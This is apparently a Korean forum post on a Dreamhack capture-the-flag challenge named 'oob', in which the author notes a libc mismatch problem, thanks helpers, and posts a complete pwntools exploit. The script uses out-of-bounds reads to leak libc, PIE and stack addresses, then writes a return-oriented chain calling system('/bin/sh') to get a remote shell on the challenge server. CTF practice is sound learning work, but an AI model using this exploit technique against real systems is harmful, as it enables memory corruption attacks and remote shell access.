도커에서 libc을 추출하고 gdb을 깔고 다시 libc을 갈아끼웠을 때 분명 안 됐는데, 그냥 내 우분투에서 libc를 쓰니까 바로 됐다... 진짜 억울하고 화난다. 앞으로는 이 방법으로 해야겠다..

ps. 도와주셔서 감사합니다 :)
```python
```python
from pwn import *

p = remote('host3.dreamhack.games', 8857)
l = ELF('./libc.so.6')
e = ELF('./oob')

def r(offset):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'offset: ', str(offset).encode())
    return p.recvn(1)

def w(offset, payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'offset: ', str(offset).encode())
    p.sendlineafter(b'value: ', str(payload).encode())

libc_base = b''
for i in range(16, 16 + 6):
    libc_base += r(i)
libc_base = u64(libc_base + b'\x00' * 2) - l.symbols['_IO_2_1_stdout_']
print("libc_base : " + hex(libc_base))

pie_base = b''
for i in range(-8, -8 + 6):
    pie_base += r(i)
pie_base = u64(pie_base + b'\x00' * 2) - e.symbols['__dso_handle']
print("pie_base : " + hex(pie_base))

environ = libc_base + l.symbols['__environ']
oob = pie_base + e.symbols['oob']
stack = b''
for i in range(environ - oob, environ - oob + 6):
    stack += r(i)
stack = u64(stack + b'\x00' * 2) - (0x7fffffffe768 - 0x7fffffffe640)
print("stack : " + hex(stack))

pop_rdi = libc_base + 0x000000000002a3e5
system = libc_base + l.symbols['system']
binsh = libc_base + list(l.search(b'/bin/sh'))[0]

offset = stack - oob

w(offset + 8 * 1, pop_rdi + 1)
w(offset + 8 * 2, pop_rdi)
w(offset + 8 * 3, binsh)
w(offset + 8 * 4, system)
p.sendlineafter(b'> ', b'3')

p.sendline(b'ls')

p.interactive()
```
```